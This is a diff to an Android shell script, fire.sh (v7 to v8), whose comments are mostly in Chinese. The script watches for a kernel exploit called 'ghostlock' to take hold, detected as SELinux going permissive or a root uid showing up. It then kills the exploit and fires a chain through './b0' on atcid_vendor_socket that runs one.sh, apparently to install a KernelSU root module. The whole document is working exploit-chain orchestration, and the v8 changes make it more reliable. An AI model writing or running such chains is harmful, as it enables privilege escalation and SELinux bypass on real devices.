@@ -1,5 +1,10 @@
 #!/system/bin/sh
-# fire.sh v7 - watch permissive/uid=0 (long window ~55min); fire ksud chain; kill supervisor
+# fire.sh v8 - stop the exploit as soon as landing is observed; fire ksud chain
+#
+# v8: LANDed 后先持久化单发标记并停止 ghostlock，再调用可能卡住的 b0。
+#     旧顺序把 .fired 写在 b0 之后；b0 卡住时 exploit 会继续跑 W2/W3，
+#     app/host 也看不到 landed 标记，可能重复攻击已污染的内核。
+#     timeout 显式用 KILL，避免 Android toybox 默认只发 TERM。
 #
 # v7 (2026-11-03, 06:59 硬重启事故修复 —— 同 boot 二次开火打崩内核):
 #   LANDED 后 .fired 记 boot_id（旧版只写 "FIRED"，无 boot 作用域，形同虚设）。
@@ -20,7 +25,7 @@
 #      PID 复用（误判存活），且同秒两次 arm 会都读不到对方 pid（双实例，
 #      13:23:25 实测 pid=16828/16840 两条 LANDED）。现在 pidfile 记
 #      "pid boot_id"，同 boot 且 /proc/<pid>/cmdline 含 fire.sh 才算存活。
-# writes pidfile so ensure_fire can check with kill -0 (pgrep -f self-matches!)
+# writes pidfile so ensure_fire can verify the process command line
 LOG=/data/local/tmp/.fire.log
 exec >>$LOG 2>&1
 
@@ -30,7 +35,7 @@ BOOTID=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null)
 # alive-dedup 失效，06:58:37 二次开火正是这种时序）
 OLDFIRED=$(cat /data/local/tmp/.fired 2>/dev/null)
 if [ -n "$BOOTID" ] && [ "$OLDFIRED" = "$BOOTID" ]; then
-  echo "=== fire v7 $(date +%T) pid=$$ fired_already: .fired matches this boot — LANDED earlier, refusing re-fire ==="
+  echo "=== fire v8 $(date +%T) pid=$$ fired_already: .fired matches this boot — LANDED earlier, refusing re-fire ==="
   exit 0
 fi
 OLD=$(cat $PIDFILE 2>/dev/null)
@@ -39,24 +44,27 @@ OLDBOOT=${OLD#* }
 if [ -n "$OLDPID" ] && [ "$OLDBOOT" = "$BOOTID" ] \
    && [ -d "/proc/$OLDPID" ] \
    && grep -q "fire.sh" "/proc/$OLDPID/cmdline" 2>/dev/null; then
-  echo "=== fire v7 $(date +%T) pid=$$ dedup: watcher pid=$OLDPID alive (same boot) — exit ==="
+  echo "=== fire v8 $(date +%T) pid=$$ dedup: watcher pid=$OLDPID alive (same boot) — exit ==="
   exit 0
 fi
 echo "$$ $BOOTID" > $PIDFILE
-echo "=== fire v7 $(date +%T) pid=$$ ==="
+echo "=== fire v8 $(date +%T) pid=$$ ==="
 i=0
 while [ $i -lt 33000 ]; do
   e=$(cat /sys/fs/selinux/enforce 2>/dev/null)
   h=$(tr -d '\000' < /data/local/tmp/.l0 2>/dev/null | tail -c 3000 | grep -ac "uid=0(root)")
   if [ "$e" = "0" ] || [ "${h:-0}" -gt 0 ]; then
     echo "LANDED e=$e u0=$h t=$i $(date +%T)"
+    # Landing dirties the kernel even if the KSU handoff below fails.
+    echo "$BOOTID" > /data/local/tmp/.fired
+    pkill -9 -f "/data/local/tmp/ghostlock" 2>/dev/null
+    pkill -9 -x ghostlock 2>/dev/null
+    echo "exploit_killed_before_chain $(date +%T)"
     sleep 0.4
     cd /data/local/tmp
-    # v6: 硬超时 —— b0 无响应也必须走到 exploit_killed
-    timeout 10 ./b0 atcid_vendor_socket "sh /data/local/tmp/one.sh #seedkeeper_client"
+    # KILL is required: Android toybox timeout otherwise defaults to TERM.
+    timeout -s KILL 10 ./b0 atcid_vendor_socket "sh /data/local/tmp/one.sh #seedkeeper_client"
     echo "chain_fired rc=$? $(date +%T)"
-    # v7: .fired 记 boot_id —— 同 boot 拒绝任何后续开火（App 侧同判据）
-    echo "$BOOTID" > /data/local/tmp/.fired
     for p in $(pgrep -f "id; getenforce; sleep 300" 2>/dev/null); do kill -9 $p 2>/dev/null; done
     echo "supervisors_killed $(date +%T)"
     # v6: wait for the KSU module, then kill the exploit -- its remaining
@@ -78,4 +86,4 @@ while [ $i -lt 33000 ]; do
   i=$((i+1))
   sleep 0.1
 done
-echo "watch_timeout v7 $(date +%T)"
+echo "watch_timeout v8 $(date +%T)"
